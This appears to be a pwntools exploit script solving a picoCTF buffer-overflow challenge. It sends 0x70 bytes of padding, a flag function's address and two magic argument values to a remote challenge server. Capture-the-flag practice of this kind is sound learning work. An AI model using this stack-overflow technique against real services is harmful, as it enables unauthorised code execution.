from pwn import *
# p = process('./vuln')
p = remote("saturn.picoctf.net", 50086)
elf = ELF('./vuln')
# gdb.attach(p)

p.recvuntil("string: ")
addr_flag =  0x08049296
payload = "A" * 0x70 + p32(addr_flag) + "AAAA" + p32(0xcafef00d) + p32(0xf00df00d)
p.sendline(payload)

p.interactive()
